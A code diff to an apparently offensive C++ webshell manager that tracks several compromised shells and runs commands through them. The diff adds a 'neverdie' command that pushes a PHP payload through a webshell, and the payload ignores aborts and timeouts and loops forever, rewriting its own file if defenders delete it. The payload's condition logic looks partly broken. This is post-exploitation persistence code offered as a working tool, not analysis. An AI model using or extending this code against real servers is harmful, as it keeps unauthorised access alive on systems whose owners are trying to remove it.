@@ -36,6 +36,27 @@ CURLcode ExecuteCommand(int shellid,string command,string& answer){
 	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
 	return shells[shellid].ShellCommandExec(command,answer);
 }
+void neverdie(int shellid){
+	if(shellid<0 ||shellid>shells.size())throw OutofBondExcetion();
+	string payload="error_reporting(0);"
+"ignore_user_abort(true);"
+"set_time_limit(0);"
+"$mb = preg_replace(\"/\\((.*)$/\",'',__FILE__);"
+"$nr =file_get_contents($mb); "
+"$md5=md5($nr);"
+"while (1==1) {"
+"if(!file_exists($mb) && md5(file_get_contents($mb))!=$nr) {"
+ "if(file_exists($mb))@unlink($mb);" 
+"file_put_contents($mb, $nr); "
+"usleep(100000);"
+"}"
+"};";
+
+cout<<payload<<endl;
+	string ans;
+	shells[shellid].php_exec(payload,ans);
+	cout<<"thread terminated:"<<ans<<endl;
+}
 void execCommand(int shellid,string command,bool sync){
 	if(shellid<0 || shellid>shells.size())throw OutofBondExcetion();
 	string answer;
@@ -252,6 +273,14 @@ int main(){
 						threads.push_back(thread(pushFile,stringToNum<int>(parseRes[1]),sourcepath,destpath,true));
 					}
 
+				}
+				else if(parseRes[0]=="neverdie"){
+					if(parseRes.size()<2){
+						cerr<<"[-]syntax error"<<endl;
+						continue;
+					}
+					int shellid=stringToNum<int>(parseRes[1]);
+					threads.push_back(thread(neverdie,shellid));
 				}
 				else{
 					cout<<"[+]Usage:\n"
